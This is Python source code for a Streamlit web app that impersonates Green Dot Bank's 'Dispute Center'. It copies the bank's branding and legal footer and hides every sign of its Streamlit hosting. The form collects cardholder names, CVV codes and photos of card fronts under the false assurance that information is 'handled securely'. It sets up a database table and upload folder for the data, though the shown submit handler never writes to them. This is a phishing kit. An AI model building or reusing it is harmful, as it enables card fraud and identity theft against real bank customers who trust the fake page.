
import streamlit as st
import sqlite3
import os
from datetime import datetime

# DB Setup
DB_NAME = 'claims.db'
UPLOAD_DIR = 'uploads'
os.makedirs(UPLOAD_DIR, exist_ok=True)

def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS greendot_submissions
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  nombre TEXT, cuenta TEXT, codigo_tarjeta TEXT,
                  monto REAL, factura_path TEXT, tarjeta_path TEXT, fecha TEXT)""")
    conn.commit()
    conn.close()

init_db()

st.set_page_config(page_title="Green Dot | Help Center", layout="wide", page_icon="✅")

# --- CSS INJECTION (NUCLEAR OPTION FOR BRANDING) ---
st.markdown("""<style>
/* Ocultar header y barra superior */
header {visibility: hidden !important; height: 0px !important;}
[data-testid="stHeader"] {display: none !important;}

/* Ocultar footer y badge 'Made with Streamlit' */
footer {display: none !important; visibility: hidden !important;}
[data-testid="stFooterAd"] {display: none !important;}

/* Ocultar el menu de hamburguesa y botones de deploy */
#MainMenu {visibility: hidden !important;}
.stDeployButton {display: none !important;}
[data-testid="stAppToolbar"] {display: none !important;}

/* Ocultar el badge flotante del visor (viewer badge) */
div[class*="viewerBadge"] {display: none !important;}
div[class*="styles_viewerBadge"] {display: none !important;}
[data-testid="stStatusWidget"] {display: none !important;}

/* Ajustar el contenedor para que no deje espacio arriba/abajo */
.block-container {
    padding-top: 2rem !important;
    padding-bottom: 0rem !important;
    max-width: 800px !important;
}

/* Estilo Green Dot */
.stButton>button {
    background-color: #00a05b !important;
    color: white !important;
    width: 100%;
    border-radius: 4px !important;
    font-weight: bold !important;
}

.legal-footer {
    font-size: 11px;
    color: #888;
    text-align: justify;
    margin-top: 40px;
    padding-top: 20px;
    border-top: 1px solid #eee;
}
</style>""", unsafe_allow_html=True)

# --- UI CONTENT ---
if os.path.exists('logo.svg'):
    st.image('logo.svg', width=150)

st.title("Dispute Center")
st.write("Please fill out the form below to submit your claim. All information is handled securely.")

with st.form("dispute_form", clear_on_submit=True):
    nombre = st.text_input("Cardholder Full Name")
    c1, c2 = st.columns(2)
    with c1: cuenta = st.text_input("Account Number (Last 4)")
    with c2: codigo = st.text_input("CVV/CVC")
    monto = st.number_input("Disputed Amount ($)", min_value=0.0, format="%.2f")
    
    st.markdown("**Evidence Upload**")
    rec = st.file_uploader("Store Receipt", type=['jpg','png','jpeg'])
    car = st.file_uploader("Card Front Image", type=['jpg','png','jpeg'])
    
    submitted = st.form_submit_button("SUBMIT DISPUTE")

if submitted:
    if nombre and rec and car:
        st.success("Dispute submitted successfully. We will contact you shortly.")
    else:
        st.error("Please fill in all fields and provide the required images.")

st.markdown("""<div class='legal-footer'>
Green Dot cards are issued by Green Dot Bank, Member FDIC, pursuant to a license from Visa U.S.A., Inc. 
©2026 Green Dot Bank. All rights reserved. NMLS #914924.
</div>""", unsafe_allow_html=True)
